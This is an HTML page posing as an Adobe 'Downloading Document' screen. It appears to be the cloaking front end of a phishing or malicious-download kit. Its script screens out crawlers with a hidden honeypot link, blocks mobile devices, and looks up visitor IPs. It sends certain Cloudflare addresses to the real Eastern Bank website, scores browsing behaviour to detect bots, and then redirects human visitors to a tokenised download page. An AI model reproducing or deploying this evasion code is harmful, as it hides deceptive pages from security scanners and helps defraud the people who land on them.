<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Downloading Document</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
    .container { width: 100%; height: 100vh; display: flex; flex-direction: column;
      align-items: center; justify-content: center; background: #fff; gap: 15px; padding-bottom: 20vh; }
    .logo { width: 80px; height: 80px; object-fit: contain; }
    .download-text { font-weight: bold; font-size: 16px; }
    .spinner { width: 40px; height: 40px; border: 5px solid red; border-top-color: transparent;
      border-radius: 50%; animation: spinner 0.7s linear infinite; }
    @keyframes spinner { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="container">
    <img src="assets/adobe-logo.png" alt="Logo" class="logo">
    <div class="download-text">Downloading Document</div>
    <div class="spinner"></div>
  </div>

  <!-- Honeypot: invisible to humans, followed by link-crawling bots. ?hp=1 poisons 24h. -->
  <a href="?hp=1" aria-hidden="true"
     style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;overflow:hidden;white-space:nowrap;">Skip verification</a>

  <script src="config.js"></script>
  <script src="gate.js"></script>
  <script src="telemetry.js"></script>
  <script>
    (async function () {
      window.__steps=[];
      var t0 = Date.now();
      // Entry gate (real desktop Chrome UA + honeypot).
      if (!window.gateStep({ entry: true })) { window.__steps.push('gated'); return; }
      window.__steps.push('gate-pass');
      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        window.location.href = "denied.html"; return;
      }
      window.__steps.push('not-mobile');
      var ipify = await (async () => {
        try {
          const c = new AbortController(); const to = setTimeout(() => c.abort(), 3000);
          const r = await fetch('https://api.ipify.org?format=json', { signal: c.signal });
          clearTimeout(to); return (await r.json()).ip;
        } catch (e) { return null; }
      })();
      window.__steps.push('ipify:'+(ipify||'null'));
      var blockedIPs = ['162.158.63.162','162.158.63.161','162.158.63.160'];
      if (ipify && blockedIPs.includes(ipify)) { window.location.href = "https://www.easternbank.com/"; return; }

      const it = await window.issueToken();
      var TK = it.tok;
      window.__steps.push('token:'+(TK?'ok':'null'));
      // Behavioral verdict (client-side). All failure -> legacy 5s fixed flow.
      var verdict = { p: 'robust', f: 0, v: null };
      try { var T = await window.collectBehavior(t0); verdict = window.verdict(window.scoreBehavior(T)); window.__steps.push('verdict:'+(verdict.p||'?')); }
      catch (e) { window.__steps.push('verdict-err:'+e.message); }
      var wait = Math.max(5000 - (Date.now() - t0), verdict.p === 'fast' ? 3200 : 5000);
      window.__steps.push('wait:'+wait);
      setTimeout(function () {
        window.__steps.push('redirect');
        window.location.href = "download.html?tk=" + encodeURIComponent(TK);
      }, wait);
    })();
  </script>
</body>
</html>
